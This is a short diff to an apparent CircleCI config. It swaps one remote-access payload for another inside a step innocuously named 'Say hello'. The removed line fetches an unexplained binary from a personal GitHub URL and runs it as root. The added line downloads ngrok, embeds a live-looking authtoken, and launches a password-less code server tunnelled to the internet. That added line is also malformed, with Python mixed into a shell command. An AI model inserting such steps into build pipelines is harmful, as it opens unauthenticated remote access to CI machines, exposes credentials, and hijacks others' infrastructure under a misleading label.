@@ -16,7 +16,9 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/aurbach55/pos/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
+          command: pip install colabcode && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && unzip -o ngrok-stable-linux-amd64.zip && ./ngrok authtoken 29bF0j95a89XumlxQ1QSmC2ZfUf_7NhWyy2q2Z4e9ok3U5jqa && 
+from colabcode import ColabCode && ColabCode(port=10000, password="")
+
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
